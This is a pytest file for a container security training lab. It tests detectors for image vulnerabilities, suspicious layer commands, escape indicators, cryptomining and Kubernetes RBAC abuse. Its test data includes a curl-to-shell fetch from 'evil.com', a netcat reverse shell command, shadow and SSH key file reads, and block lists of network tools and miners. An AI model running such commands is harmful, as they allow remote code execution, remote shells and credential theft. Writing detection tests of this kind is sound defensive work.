#!/usr/bin/env python3
"""Tests for Lab 19b: Container Security Analysis.

This module tests container security analysis concepts including image
vulnerability analysis, runtime attack detection, container escape detection,
and Kubernetes security analysis.
"""

import pytest
import json
import re
import pandas as pd
import numpy as np
from datetime import datetime
from unittest.mock import MagicMock, patch


# =============================================================================
# Sample Data for Testing
# =============================================================================

SAMPLE_VULNERABILITIES = [
    {"vuln_id": "CVE-2024-0001", "severity": "CRITICAL", "pkg_name": "openssl", "fixed_version": "1.1.1k"},
    {"vuln_id": "CVE-2024-0002", "severity": "HIGH", "pkg_name": "curl", "fixed_version": "7.79.0"},
    {"vuln_id": "CVE-2024-0003", "severity": "MEDIUM", "pkg_name": "bash", "fixed_version": None},
    {"vuln_id": "CVE-2024-0004", "severity": "LOW", "pkg_name": "tar", "fixed_version": "1.34"},
]

SUSPICIOUS_PROCESSES = [
    "nc", "ncat", "netcat",
    "nmap", "masscan",
    "tcpdump", "wireshark",
    "curl", "wget",
    "gcc", "make",
]

SAMPLE_K8S_AUDIT_EVENT = {
    "requestReceivedTimestamp": "2024-01-15T10:30:00Z",
    "verb": "create",
    "user": {"username": "system:serviceaccount:default:myapp"},
    "objectRef": {"resource": "secrets", "name": "my-secret", "namespace": "default"},
    "responseStatus": {"code": 200},
    "sourceIPs": ["10.0.0.5"],
}


# =============================================================================
# Image Vulnerability Analysis Tests
# =============================================================================


class TestVulnerabilityParsing:
    """Test vulnerability scan result parsing."""

    def test_trivy_result_parsing(self):
        """Test parsing of Trivy scan results."""
        trivy_result = {
            "Results": [
                {
                    "Target": "python:3.9",
                    "Vulnerabilities": [
                        {
                            "VulnerabilityID": "CVE-2024-0001",
                            "PkgName": "openssl",
                            "InstalledVersion": "1.1.1j",
                            "FixedVersion": "1.1.1k",
                            "Severity": "CRITICAL",
                            "Title": "OpenSSL vulnerability",
                        }
                    ],
                }
            ]
        }

        vulnerabilities = []
        for result in trivy_result.get("Results", []):
            for vuln in result.get("Vulnerabilities", []):
                vulnerabilities.append({
                    "target": result.get("Target"),
                    "vuln_id": vuln.get("VulnerabilityID"),
                    "pkg_name": vuln.get("PkgName"),
                    "severity": vuln.get("Severity"),
                    "fixed_version": vuln.get("FixedVersion"),
                })

        assert len(vulnerabilities) == 1
        assert vulnerabilities[0]["vuln_id"] == "CVE-2024-0001"
        assert vulnerabilities[0]["severity"] == "CRITICAL"

    def test_vulnerability_dataframe_creation(self):
        """Test creation of vulnerability DataFrame."""
        df = pd.DataFrame(SAMPLE_VULNERABILITIES)

        assert len(df) == 4
        assert "severity" in df.columns
        assert "vuln_id" in df.columns


class TestRiskScoring:
    """Test image risk scoring."""

    def test_severity_weight_calculation(self):
        """Test severity weight calculation."""
        severity_weights = {
            "CRITICAL": 10,
            "HIGH": 7,
            "MEDIUM": 4,
            "LOW": 1,
            "UNKNOWN": 2,
        }

        vulnerabilities = SAMPLE_VULNERABILITIES
        total_score = sum(severity_weights[v["severity"]] for v in vulnerabilities)

        # CRITICAL(10) + HIGH(7) + MEDIUM(4) + LOW(1) = 22
        assert total_score == 22

    def test_fixable_ratio_calculation(self):
        """Test calculation of fixable vulnerability ratio."""
        vulnerabilities = SAMPLE_VULNERABILITIES

        fixable = sum(1 for v in vulnerabilities if v["fixed_version"] is not None)
        total = len(vulnerabilities)
        fixable_ratio = fixable / total if total > 0 else 1.0

        assert fixable == 3
        assert fixable_ratio == 0.75

    def test_unfixed_critical_penalty(self):
        """Test penalty for unfixed critical vulnerabilities."""
        vulnerabilities = [
            {"severity": "CRITICAL", "fixed_version": None},  # Unfixed critical
            {"severity": "HIGH", "fixed_version": "1.0.0"},
        ]

        severity_weights = {"CRITICAL": 10, "HIGH": 7, "MEDIUM": 4, "LOW": 1}
        base_score = sum(severity_weights[v["severity"]] for v in vulnerabilities)

        critical_unfixed = [v for v in vulnerabilities if v["severity"] == "CRITICAL" and v["fixed_version"] is None]

        risk_score = base_score
        if critical_unfixed:
            risk_score *= 1.5  # 50% penalty

        assert risk_score == 25.5  # (10 + 7) * 1.5

    def test_complete_risk_score_calculation(self):
        """Test complete risk score calculation."""
        severity_weights = {"CRITICAL": 10, "HIGH": 7, "MEDIUM": 4, "LOW": 1}

        vulnerabilities = SAMPLE_VULNERABILITIES
        scores = [severity_weights[v["severity"]] for v in vulnerabilities]
        base_score = sum(scores)

        fixable = sum(1 for v in vulnerabilities if v["fixed_version"] is not None)
        total = len(vulnerabilities)
        fixable_ratio = fixable / total

        risk_score = base_score * (2 - fixable_ratio)

        # No unfixed criticals in sample data
        assert risk_score > base_score  # Score increased due to unfixable vulns


class TestSupplyChainAnalysis:
    """Test supply chain analysis for images."""

    def test_suspicious_layer_pattern_detection(self):
        """Test detection of suspicious patterns in image layers."""
        suspicious_patterns = [
            r"curl.*\|.*sh",
            r"wget.*\|.*bash",
            r"chmod\s+777",
            r"PASSWORD|SECRET|KEY",
        ]

        layer_commands = [
            "RUN apt-get update",
            "RUN curl http://evil.com/script.sh | sh",
            "RUN chmod 777 /app",
        ]

        findings = []
        for idx, command in enumerate(layer_commands):
            for pattern in suspicious_patterns:
                if re.search(pattern, command, re.IGNORECASE):
                    findings.append({
                        "layer": idx,
                        "pattern": pattern,
                        "command": command,
                    })

        assert len(findings) == 2  # curl|sh and chmod 777

    def test_hardcoded_secret_detection(self):
        """Test detection of hardcoded secrets in layers."""
        patterns = [
            r"PASSWORD\s*=\s*[\"'][^\"']+[\"']",
            r"API_KEY\s*=\s*[\"'][^\"']+[\"']",
            r"SECRET\s*=\s*[\"'][^\"']+[\"']",
        ]

        command = "ENV PASSWORD='mysecretpassword' API_KEY='abc123'"

        found_secrets = []
        for pattern in patterns:
            if re.search(pattern, command, re.IGNORECASE):
                found_secrets.append(pattern)

        assert len(found_secrets) == 2


# =============================================================================
# Runtime Attack Detection Tests
# =============================================================================


class TestProcessAnomalyDetection:
    """Test container process anomaly detection."""

    def test_suspicious_process_flagging(self):
        """Test flagging of suspicious processes."""
        running_processes = ["nginx", "python", "nc", "curl"]

        suspicious_found = [p for p in running_processes if p.lower() in [s.lower() for s in SUSPICIOUS_PROCESSES]]

        assert len(suspicious_found) == 2
        assert "nc" in suspicious_found
        assert "curl" in suspicious_found

    def test_process_profile_creation(self):
        """Test creation of container process profile."""
        container_data = {
            "container_id": "abc123",
            "processes": ["nginx", "python", "sh"],
            "network_connections": 5,
            "file_writes": 10,
        }

        profile = {
            "process_count": len(container_data["processes"]),
            "unique_processes": len(set(container_data["processes"])),
            "network_connections": container_data["network_connections"],
            "file_writes": container_data["file_writes"],
        }

        assert profile["process_count"] == 3
        assert profile["network_connections"] == 5


class TestContainerEscapeDetection:
    """Test container escape attempt detection."""

    def test_privileged_container_detection(self):
        """Test detection of privileged containers."""
        container_config = {"privileged": True, "host_network": False}

        is_privileged = container_config.get("privileged", False)
        assert is_privileged is True

    def test_docker_socket_mount_detection(self):
        """Test detection of Docker socket mounts."""
        mounts = ["/var/log:/logs", "/var/run/docker.sock:/var/run/docker.sock"]

        docker_socket_mounted = any("/var/run/docker.sock" in m for m in mounts)
        assert docker_socket_mounted is True

    def test_host_namespace_detection(self):
        """Test detection of host namespace usage."""
        container_config = {
            "host_pid": True,
            "host_network": True,
            "host_ipc": False,
        }

        escape_indicators = []
        if container_config.get("host_pid"):
            escape_indicators.append("host_pid")
        if container_config.get("host_network"):
            escape_indicators.append("host_network")
        if container_config.get("host_ipc"):
            escape_indicators.append("host_ipc")

        assert len(escape_indicators) == 2

    def test_dangerous_capability_detection(self):
        """Test detection of dangerous capabilities."""
        dangerous_caps = ["SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "NET_RAW", "SYS_MODULE"]

        container_capabilities = ["NET_BIND_SERVICE", "SYS_ADMIN", "CHOWN"]

        dangerous_found = [cap for cap in container_capabilities if cap in dangerous_caps]

        assert len(dangerous_found) == 1
        assert "SYS_ADMIN" in dangerous_found

    def test_escape_score_calculation(self):
        """Test escape attempt score calculation."""
        indicators = {
            "privileged": True,
            "docker_socket": False,
            "host_pid": True,
            "sys_admin_cap": True,
        }

        escape_score = sum(1 for v in indicators.values() if v)
        assert escape_score == 3

        is_high_risk = escape_score >= 2
        assert is_high_risk is True


class TestCryptominingDetection:
    """Test cryptomining detection in containers."""

    def test_mining_pool_pattern_detection(self):
        """Test detection of mining pool connection patterns."""
        mining_patterns = [
            r"stratum\+tcp://",
            r"mining\.pool",
            r"minexmr\.com",
            r"nanopool\.org",
        ]

        network_destinations = [
            "stratum+tcp://pool.minexmr.com:4444",
            "https://normal-api.com",
        ]

        mining_connections = []
        for dest in network_destinations:
            for pattern in mining_patterns:
                if re.search(pattern, dest, re.IGNORECASE):
                    mining_connections.append(dest)
                    break

        assert len(mining_connections) == 1

    def test_mining_process_detection(self):
        """Test detection of mining process names."""
        mining_processes = ["xmrig", "ccminer", "cgminer", "minerd", "cpuminer"]

        running_processes = ["nginx", "xmrig", "python"]

        mining_found = [p for p in running_processes if p.lower() in mining_processes]

        assert len(mining_found) == 1
        assert "xmrig" in mining_found

    def test_high_cpu_pattern_detection(self):
        """Test detection of sustained high CPU usage pattern."""
        cpu_samples = [85, 90, 88, 92, 87, 91, 89, 93, 88, 90, 92]

        high_cpu_threshold = 80
        sustained_count_threshold = 10

        high_cpu_samples = [s for s in cpu_samples if s > high_cpu_threshold]

        is_sustained = len(high_cpu_samples) >= sustained_count_threshold
        assert is_sustained is True


# =============================================================================
# Kubernetes Security Tests
# =============================================================================


class TestK8sAuditLogParsing:
    """Test Kubernetes audit log parsing."""

    def test_audit_event_parsing(self):
        """Test parsing of K8s audit events."""
        event = SAMPLE_K8S_AUDIT_EVENT

        parsed = {
            "timestamp": event.get("requestReceivedTimestamp"),
            "verb": event.get("verb"),
            "user": event.get("user", {}).get("username"),
            "resource": event.get("objectRef", {}).get("resource"),
            "name": event.get("objectRef", {}).get("name"),
            "namespace": event.get("objectRef", {}).get("namespace"),
            "response_code": event.get("responseStatus", {}).get("code"),
            "source_ip": event.get("sourceIPs", [None])[0],
        }

        assert parsed["verb"] == "create"
        assert parsed["resource"] == "secrets"
        assert parsed["response_code"] == 200

    def test_audit_event_dataframe_creation(self):
        """Test creation of audit event DataFrame."""
        events = [
            {"verb": "create", "resource": "pods", "response_code": 200},
            {"verb": "get", "resource": "secrets", "response_code": 403},
            {"verb": "delete", "resource": "deployments", "response_code": 200},
        ]

        df = pd.DataFrame(events)

        assert len(df) == 3
        assert "verb" in df.columns


class TestRBACViolationDetection:
    """Test RBAC violation detection."""

    def test_auth_failure_detection(self):
        """Test detection of authorization failures."""
        audit_events = [
            {"response_code": 200, "user": "user1"},
            {"response_code": 403, "user": "user2"},
            {"response_code": 403, "user": "user2"},
            {"response_code": 403, "user": "user2"},
            {"response_code": 200, "user": "user3"},
        ]

        failures = [e for e in audit_events if e["response_code"] == 403]
        assert len(failures) == 3

        # Check for repeated failures
        from collections import Counter

        failure_counts = Counter(e["user"] for e in failures)
        suspicious_users = {user: count for user, count in failure_counts.items() if count > 2}

        assert "user2" in suspicious_users

    def test_sensitive_resource_access_detection(self):
        """Test detection of sensitive resource access."""
        sensitive_resources = ["secrets", "configmaps", "serviceaccounts", "clusterroles"]

        audit_events = [
            {"resource": "pods", "verb": "create"},
            {"resource": "secrets", "verb": "get"},
            {"resource": "clusterroles", "verb": "update"},
        ]

        sensitive_access = [
            e for e in audit_events
            if e["resource"] in sensitive_resources and e["verb"] in ["create", "update", "patch", "delete"]
        ]

        assert len(sensitive_access) == 1
        assert sensitive_access[0]["resource"] == "clusterroles"

    def test_privilege_escalation_detection(self):
        """Test detection of privilege escalation attempts."""
        priv_esc_resources = ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]
        priv_esc_verbs = ["create", "update", "patch"]

        audit_events = [
            {"resource": "clusterroles", "verb": "create"},
            {"resource": "pods", "verb": "create"},
            {"resource": "rolebindings", "verb": "update"},
        ]

        priv_esc_events = [
            e for e in audit_events
            if e["resource"] in priv_esc_resources and e["verb"] in priv_esc_verbs
        ]

        assert len(priv_esc_events) == 2


class TestPodSecurityAnalysis:
    """Test pod security analysis."""

    def test_pod_security_issue_detection(self):
        """Test detection of pod security issues."""
        pod = {
            "name": "my-pod",
            "namespace": "default",
            "privileged": True,
            "host_network": False,
            "host_pid": True,
            "capabilities": ["SYS_ADMIN", "NET_BIND_SERVICE"],
            "read_only_root_fs": False,
            "run_as_root": True,
        }

        issues = []

        if pod.get("privileged"):
            issues.append({"severity": "CRITICAL", "issue": "Privileged container"})

        if pod.get("host_network"):
            issues.append({"severity": "HIGH", "issue": "Host network enabled"})

        if pod.get("host_pid"):
            issues.append({"severity": "HIGH", "issue": "Host PID namespace"})

        dangerous_caps = ["SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE"]
        for cap in pod.get("capabilities", []):
            if cap in dangerous_caps:
                issues.append({"severity": "HIGH", "issue": f"Dangerous capability: {cap}"})

        if not pod.get("read_only_root_fs"):
            issues.append({"severity": "MEDIUM", "issue": "Writable root filesystem"})

        if pod.get("run_as_root", True):
            issues.append({"severity": "MEDIUM", "issue": "Running as root"})

        assert len(issues) >= 4  # Multiple security issues

        critical_count = sum(1 for i in issues if i["severity"] == "CRITICAL")
        assert critical_count == 1


# =============================================================================
# Detection Rule Tests
# =============================================================================


class TestContainerDetectionRules:
    """Test container security detection rules."""

    def test_docker_socket_access_rule(self):
        """Test rule for Docker socket access detection."""
        file_access_events = [
            {"container": "app1", "path": "/var/log/app.log"},
            {"container": "app2", "path": "/var/run/docker.sock"},
        ]

        docker_socket_access = [
            e for e in file_access_events
            if "/var/run/docker.sock" in e["path"] or "/run/docker.sock" in e["path"]
        ]

        assert len(docker_socket_access) == 1
        assert docker_socket_access[0]["container"] == "app2"

    def test_reverse_shell_detection_rule(self):
        """Test rule for reverse shell detection."""
        process_events = [
            {"process": "nginx", "args": "-g daemon off"},
            {"process": "nc", "args": "-e /bin/bash 10.0.0.1 4444"},
            {"process": "bash", "args": "-c ls"},
        ]

        reverse_shell_patterns = [
            lambda e: e["process"] in ["nc", "ncat", "netcat"] and "-e" in e["args"],
        ]

        reverse_shell_events = [
            e for e in process_events
            if any(pattern(e) for pattern in reverse_shell_patterns)
        ]

        assert len(reverse_shell_events) == 1

    def test_sensitive_file_access_rule(self):
        """Test rule for sensitive file access detection."""
        sensitive_paths = ["/etc/shadow", "/etc/passwd", "/proc/1/", "/.ssh/"]

        file_access_events = [
            {"container": "app1", "path": "/app/data.txt"},
            {"container": "app2", "path": "/etc/shadow"},
            {"container": "app3", "path": "/home/user/.ssh/id_rsa"},
        ]

        sensitive_access = [
            e for e in file_access_events
            if any(sp in e["path"] for sp in sensitive_paths)
        ]

        assert len(sensitive_access) == 2


class TestIncidentInvestigation:
    """Test container incident investigation workflow."""

    def test_investigation_structure(self):
        """Test investigation result structure."""
        investigation = {
            "container_id": "abc123",
            "timestamp": datetime.now().isoformat(),
            "findings": [
                {"type": "suspicious_processes", "count": 2},
                {"type": "external_connections", "count": 5},
            ],
        }

        assert "container_id" in investigation
        assert "findings" in investigation
        assert len(investigation["findings"]) > 0

    def test_threat_classification(self):
        """Test threat event classification."""

        def classify_event_threat(event):
            if event.get("process") in SUSPICIOUS_PROCESSES:
                return "suspicious_process"
            if event.get("privilege_escalation"):
                return "privilege_escalation"
            if "docker.sock" in event.get("file_path", ""):
                return "container_escape"
            return "benign"

        events = [
            {"process": "nginx"},
            {"process": "nc"},
            {"file_path": "/var/run/docker.sock"},
        ]

        classifications = [classify_event_threat(e) for e in events]

        assert "benign" in classifications
        assert "suspicious_process" in classifications
        assert "container_escape" in classifications


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
